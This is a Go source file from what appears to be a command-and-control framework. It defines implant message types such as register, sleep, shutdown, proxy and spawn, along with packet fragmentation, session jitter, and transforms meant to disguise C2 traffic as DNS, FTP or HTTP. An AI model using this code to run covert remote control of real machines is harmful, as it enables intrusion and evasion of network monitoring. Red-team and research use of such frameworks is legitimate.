package c2

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
)

const (
	MsgPing       = 0xFE00
	MsgSleep      = 0xFE01
	MsgHello      = 0xFE02
	MsgResult     = 0xFE13
	MsgProfile    = 0xFE15
	MsgRegister   = 0xFE05
	MsgMultiple   = 0xFE03
	MsgShutdown   = 0xFE04
	MsgRegistered = 0xFE06

	// Actions
	/*
		MsgUpload    = uint16(control.Upload)
		MsgRefresh   = uint16(control.Refresh)
		MsgExecute   = uint16(control.Execute)
		MsgDownload  = uint16(control.Download)
		MsgProcesses = uint16(control.ProcessList)*/

	MsgProxy = 0xFE11 // registry required
	MsgSpawn = 0xFE12 // registry required

	MsgError = 0xFEEF
)

var (
	buffers = sync.Pool{
		New: func() interface{} {
			return new(data.Chunk)
		},
	}

	wake waker
)

type waker struct{}
type event struct {
	s     *Session
	p     *com.Packet
	j     *Job
	jFunc func(*Job)
	sFunc func(*Session)
	nFunc func(*com.Packet)
	pFunc func(*Session, *com.Packet)
}
type connection struct {
	Mux Mux

	s      *Server
	w      Wrapper
	t      Transform
	ctx    context.Context
	log    logx.Log
	cancel context.CancelFunc
}
type serverClient interface {
	Connect(string) (net.Conn, error)
}
type serverListener interface {
	Listen(string) (net.Listener, error)
}

// Wrapper is an interface that wraps the binary streams into separate stream types. This allows for using
// encryption or compression (or both!).
type Wrapper interface {
	Wrap(io.WriteCloser) (io.WriteCloser, error)
	Unwrap(io.ReadCloser) (io.ReadCloser, error)
}

// Transform is an interface that can modify the data BEFORE it is written or AFTER is read from a Connection.
// Transforms may be used to mask and unmask communications as benign protocols such as DNS, FTP or HTTP.
type Transform interface {
	Read(io.Writer, []byte) error
	Write(io.Writer, []byte) error
}

func returnBuffer(c *data.Chunk) {
	c.Reset()
	buffers.Put(c)
}
func (e event) process(l logx.Log) {
	defer func(x logx.Log) {
		if err := recover(); err != nil && x != nil {
			x.Error("Server event processing function recovered from a panic: %s!", err)
		}
	}(l)
	switch {
	case e.jFunc != nil && e.j != nil:
		e.jFunc(e.j)
	case e.pFunc != nil && e.p != nil && e.s != nil:
		e.pFunc(e.s, e.p)
	case e.nFunc != nil && e.p != nil && e.s == nil:
		e.nFunc(e.p)
	case e.sFunc != nil && e.s != nil && e.p == nil:
		e.sFunc(e.s)
	}
	e.p, e.s, e.j = nil, nil, nil
	e.pFunc, e.sFunc, e.jFunc = nil, nil, nil
}
func notify(l *Listener, s *Session, p *com.Packet) error {
	if (l == nil && s == nil) || p == nil || p.Device == nil {
		return nil
	}
	if s != nil && !bytes.Equal(p.Device, s.Device.ID) && p.Flags&com.FlagMultiDevice == 0 {
		if s.swarm != nil && s.swarm.accept(p) {
			return nil
		}
		if p.ID == MsgRegister {
			p.Device = s.Device.ID
		} else {
			return ErrInvalidPacketID
		}
	}
	if l != nil && p.Flags&com.FlagOneshot != 0 {
		if l.Oneshot != nil {
			l.s.events <- event{p: p, nFunc: l.Oneshot}
		} else if l.Receive != nil {
			l.s.events <- event{p: p, pFunc: l.Receive}
		}
		return nil
	}
	if s == nil {
		return nil
	}
	switch p.ID {
	case MsgPing, MsgHello, MsgSleep:
		if p.Flags&com.FlagData == 0 {
			return nil
		}
	}
	switch {
	case p.Flags&com.FlagData != 0 && p.Flags&com.FlagMulti == 0 && p.Flags&com.FlagFrag == 0:
		n := new(com.Packet)
		if err := n.UnmarshalStream(p); err != nil {
			return err
		}
		p.Clear()
		return notify(l, s, n)
	case p.Flags&com.FlagMulti != 0:
		x := p.Flags.Len()
		if x == 0 {
			return ErrInvalidPacketCount
		}
		for i := uint16(0); i < x; i++ {
			n := new(com.Packet)
			if err := n.UnmarshalStream(p); err != nil {
				return err
			}
			notify(l, s, n)
		}
		p.Clear()
		return nil
	case p.Flags&com.FlagFrag != 0 && p.Flags&com.FlagMulti == 0:
		if p.Flags.Len() == 0 {
			// wrapped frags getting reset
			return ErrInvalidPacketCount
		}
		if p.Flags.Len() == 1 {
			p.Flags.Clear()
			notify(l, s, p)
			return nil
		}
		var (
			g     = p.Flags.Group()
			c, ok = s.frags[g]
		)
		if !ok {
			s.frags[g] = new(cluster)
		}
		if err := c.add(p); err != nil {
			return err
		}
		if n := c.done(); n != nil {
			notify(l, s, n)
			delete(s.frags, g)
		}
		return nil
	}
	notifyClient(l, s, p)
	return nil
}
func notifyClient(l *Listener, s *Session, p *com.Packet) {
	if s != nil {
		switch p.ID {
		case MsgProfile:
			if j, err := p.Uint8(); err == nil && j >= 0 && j <= 100 {
				s.jitter = j
			}
			if t, err := p.Uint64(); err == nil && t > 0 {
				s.sleep = time.Duration(t)
			}
			s.log.Debug("[%s] Updated Sleep/Jitter settings from server (%s/%d%%).", s.ID, s.sleep.String(), s.jitter)
			if p.Flags&com.FlagData == 0 {
				return
			}
		case MsgShutdown:
			switch {
			case p.Job == 1 && s.parent == nil:
				s.log.Debug("[%s] Server acknowledged shutdown, closing Session.", s.ID)
				s.shutdown(shutdownClose)
				return
			case s.parent == nil:
				s.log.Debug("[%s] Server indicated shutdown, acknowledging and closing Session.", s.ID)
				s.shutdown(shutdownAck)
				return
			case p.Job == 1 && s.parent != nil:
				s.log.Debug("[%s] Client acknowledged shutdown, closing Session.", s.ID)
				s.shutdown(shutdownClose)
			default:
				s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
				s.shutdown(shutdownAck)
			}
			if s.Shutdown != nil {
				s.s.events <- event{s: s, sFunc: s.Shutdown}
			}
			s.parent.close <- s.Device.ID.Hash()
			s.Close()
			return
		case MsgRegister:
			n := &com.Packet{ID: MsgHello, Job: uint16(util.Rand.Uint32())}
			device.Local.MarshalStream(n)
			n.Close()
			s.send <- n
			if p.Flags&com.FlagData == 0 {
				return
			}
		}
	}
	if l != nil && l.Receive != nil {
		l.s.events <- event{s: s, p: p, pFunc: l.Receive}
	}
	if s == nil {
		return
	}
	if s.Receive != nil {
		l.s.events <- event{s: s, p: p, pFunc: s.Receive}
	}
	if len(s.recv) == cap(s.recv) {
		// Clear the buffer of the last Packet as we don't want to block
		<-s.recv
	}
	s.recv <- p
	switch {
	case s.Mux != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.Mux.Handle}
	case s.parent.Mux != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.parent.Mux.Handle}
	case s.s.Scheduler != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.s.Scheduler.Handle}
	}
}
func readPacket(c io.Reader, w Wrapper, t Transform) (*com.Packet, error) {
	b := buffers.Get().(*data.Chunk)
	if _, err := b.ReadFrom(c); err != nil && err != io.EOF {
		returnBuffer(b)
		return nil, fmt.Errorf("unable to read from stream reader: %w", err)
	}
	b.Close()
	if t != nil {
		var (
			i   = buffers.Get().(*data.Chunk)
			err = t.Read(i, b.Payload())
		)
		returnBuffer(b)
		if err != nil {
			returnBuffer(i)
			return nil, fmt.Errorf("unable to transform reader: %w", err)
		}
		b = i
	}
	var r data.Reader = b
	if w != nil {
		u, err := w.Unwrap(b)
		if err != nil {
			returnBuffer(b)
			return nil, fmt.Errorf("unable to wrap stream reader: %w", err)
		}
		r = data.NewReader(u)
	}
	var (
		p   = &com.Packet{}
		err = p.UnmarshalStream(r)
	)
	returnBuffer(b)
	if err != nil && err != io.EOF {
		return nil, fmt.Errorf("unable to read from cache reader: %w", err)
	}
	if err := r.Close(); err != nil {
		return nil, fmt.Errorf("unable to close cache reader: %w", err)
	}
	return p, nil
}
func writePacket(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
	var (
		b             = buffers.Get().(*data.Chunk)
		s data.Writer = b
	)
	if w != nil {
		x, err := w.Wrap(b)
		if err != nil {
			returnBuffer(b)
			return fmt.Errorf("unable to wrap writer: %w", err)
		}
		s = data.NewWriter(x)
	}
	if err := p.MarshalStream(s); err != nil {
		returnBuffer(b)
		return fmt.Errorf("unable to write to cache writer: %w", err)
	}
	if err := s.Close(); err != nil {
		returnBuffer(b)
		return fmt.Errorf("unable to close cache writer: %w", err)
	}
	if t != nil {
		var (
			i   = buffers.Get().(*data.Chunk)
			err = t.Write(i, b.Payload())
		)
		returnBuffer(b)
		if err != nil {
			returnBuffer(i)
			return fmt.Errorf("unable to transform writer: %w", err)
		}
		b = i
	}
	_, err := b.WriteTo(c)
	returnBuffer(b)
	if err != nil {
		return fmt.Errorf("unable to write to stream writer: %w", err)
	}
	return nil
}
